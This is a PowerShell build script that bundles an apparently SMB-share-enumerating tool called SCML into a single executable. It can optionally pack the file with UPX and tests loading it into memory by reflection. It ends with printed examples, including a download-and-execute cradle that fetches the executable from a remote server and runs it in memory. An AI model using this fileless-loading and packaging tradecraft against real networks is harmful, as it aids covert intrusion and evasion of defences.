# PowerShell script to build SCML as a single self-contained executable
# Suitable for reflective loading in test lab environments

param(
    [switch]$Compress = $false,
    [switch]$Obfuscate = $false,
    [switch]$TestReflective = $false
)

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "Building SCML as single executable" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan

# Clean previous builds
Write-Host "[*] Cleaning previous builds..." -ForegroundColor Yellow
Remove-Item -Path "bin\Release\SCML_Standalone.exe" -Force -ErrorAction SilentlyContinue

# Build the solution
Write-Host "[*] Building SCML solution..." -ForegroundColor Yellow
$buildResult = & msbuild SCML.sln /p:Configuration=Release /p:Platform="Any CPU" /t:Rebuild /v:minimal

if ($LASTEXITCODE -ne 0) {
    Write-Host "[-] Build failed!" -ForegroundColor Red
    exit 1
}

# Find ILRepack
$ilrepack = $null
if (Test-Path "packages\ILRepack.2.0.44\tools\ILRepack.exe") {
    $ilrepack = "packages\ILRepack.2.0.44\tools\ILRepack.exe"
} else {
    Write-Host "[-] ILRepack not found. Installing..." -ForegroundColor Yellow
    & nuget install ILRepack -OutputDirectory packages
    $ilrepack = "packages\ILRepack.2.0.44\tools\ILRepack.exe"
}

Write-Host "[*] Using ILRepack from: $ilrepack" -ForegroundColor Green

# Navigate to output directory
Push-Location bin\Release

try {
    # Prepare ILRepack arguments
    $ilrepackArgs = @(
        "/out:SCML_Standalone.exe",
        "/targetplatform:v4",
        "/internalize",
        "/parallel",
        "/ndebug",
        "/wildcards",
        "SCML.exe",
        "CommandLine.dll",
        "Newtonsoft.Json.dll",
        "SMBLibrary.dll",
        "System.Buffers.dll",
        "System.Memory.dll",
        "System.Numerics.Vectors.dll",
        "System.Runtime.CompilerServices.Unsafe.dll"
    )

    # Merge assemblies
    Write-Host "[*] Merging assemblies..." -ForegroundColor Yellow
    & "..\..\$ilrepack" $ilrepackArgs

    if ($LASTEXITCODE -eq 0) {
        Write-Host "[+] Successfully created SCML_Standalone.exe" -ForegroundColor Green
        
        # Get file info
        $fileInfo = Get-Item SCML_Standalone.exe
        Write-Host "[*] File size: $([math]::Round($fileInfo.Length / 1MB, 2)) MB" -ForegroundColor Cyan
        Write-Host "[*] SHA256: $((Get-FileHash SCML_Standalone.exe -Algorithm SHA256).Hash)" -ForegroundColor Cyan
        
        # Optional: Compress with UPX
        if ($Compress) {
            Write-Host "[*] Compressing with UPX..." -ForegroundColor Yellow
            if (Get-Command upx -ErrorAction SilentlyContinue) {
                & upx --best --lzma SCML_Standalone.exe
                $compressedInfo = Get-Item SCML_Standalone.exe
                Write-Host "[+] Compressed size: $([math]::Round($compressedInfo.Length / 1MB, 2)) MB" -ForegroundColor Green
            } else {
                Write-Host "[!] UPX not found, skipping compression" -ForegroundColor Yellow
            }
        }
        
        # Test the merged executable
        Write-Host "`n[*] Testing merged executable..." -ForegroundColor Yellow
        $testOutput = & .\SCML_Standalone.exe --help 2>&1
        
        if ($LASTEXITCODE -eq 0) {
            Write-Host "[+] Merged executable works correctly!" -ForegroundColor Green
            
            # Test reflective loading
            if ($TestReflective) {
                Write-Host "`n[*] Testing reflective loading..." -ForegroundColor Yellow
                try {
                    $bytes = [System.IO.File]::ReadAllBytes("SCML_Standalone.exe")
                    $assembly = [System.Reflection.Assembly]::Load($bytes)
                    $entryPoint = $assembly.EntryPoint
                    Write-Host "[+] Assembly loaded successfully" -ForegroundColor Green
                    Write-Host "    Entry Point: $($entryPoint.Name)" -ForegroundColor Cyan
                    Write-Host "    Assembly: $($assembly.FullName)" -ForegroundColor Cyan
                    Write-Host "[+] Reflective loading test passed!" -ForegroundColor Green
                }
                catch {
                    Write-Host "[-] Reflective loading test failed: $_" -ForegroundColor Red
                }
            }
            
            Write-Host "`n==========================================" -ForegroundColor Cyan
            Write-Host "Build complete: bin\Release\SCML_Standalone.exe" -ForegroundColor Green
            Write-Host "This is a self-contained executable that includes all dependencies" -ForegroundColor Green
            Write-Host "Suitable for reflective loading in test environments" -ForegroundColor Green
            Write-Host "==========================================" -ForegroundColor Cyan
        } else {
            Write-Host "[-] Merged executable test failed!" -ForegroundColor Red
            exit 1
        }
    } else {
        Write-Host "[-] Merging failed!" -ForegroundColor Red
        exit 1
    }
}
finally {
    Pop-Location
}

# Output usage examples for reflective loading
Write-Host "`nReflective Loading Examples:" -ForegroundColor Yellow
Write-Host @"

PowerShell In-Memory Execution:
`$bytes = [System.IO.File]::ReadAllBytes('SCML_Standalone.exe')
`$assembly = [System.Reflection.Assembly]::Load(`$bytes)
`$assembly.EntryPoint.Invoke(`$null, @(,@('--host', 'target.domain.com', '--list-shares')))

PowerShell Remote Loading:
`$bytes = (New-Object Net.WebClient).DownloadData('http://server/SCML_Standalone.exe')
`$assembly = [System.Reflection.Assembly]::Load(`$bytes)
`$assembly.EntryPoint.Invoke(`$null, @(,@('--help')))

C# Reflective Loading:
byte[] exeBytes = File.ReadAllBytes("SCML_Standalone.exe");
Assembly assembly = Assembly.Load(exeBytes);
MethodInfo entryPoint = assembly.EntryPoint;
entryPoint.Invoke(null, new object[] { new string[] { "--host", "target", "--list-shares" } });
"@ -ForegroundColor Cyan